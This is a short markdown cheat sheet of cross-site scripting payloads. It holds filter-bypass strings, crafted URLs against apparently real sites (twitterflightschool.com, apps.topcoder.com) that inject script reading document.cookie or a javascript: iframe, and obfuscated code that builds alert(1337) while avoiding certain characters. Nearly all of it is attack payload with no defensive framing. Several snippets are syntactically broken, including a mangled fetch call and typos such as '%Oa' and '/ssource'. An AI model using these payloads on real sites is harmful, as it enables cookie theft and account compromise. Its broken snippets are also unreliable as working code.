# XSS

```js
"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description="><img+src=x+onerror=prompt(document.cookie)>

https://apps.topcoder.com/wiki/labels/%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%22%3E.vm
<IFRAME SRC="javascript:alert('XSS')">.vm


// make sure to include %Oaalert(1337) at the end of URL
fetch('/analytics', {
    method:'post',
    body:'/post?postId=3&'?location='javascript:'+location:'\nalert13371})
    .finally(_ => window.location = '/')


// create 'alert(1337)' without using "1‘()[]\%, characters
x={...eval+0,toString:Array.prototype.shift,length:15}
x+x+x+x+x+x+x+x+x+x+x+x+x
x=/alert/.source+x+1337+x
// set javascript url to execute alert(1337)
location=/javascript:/ssource+x
```
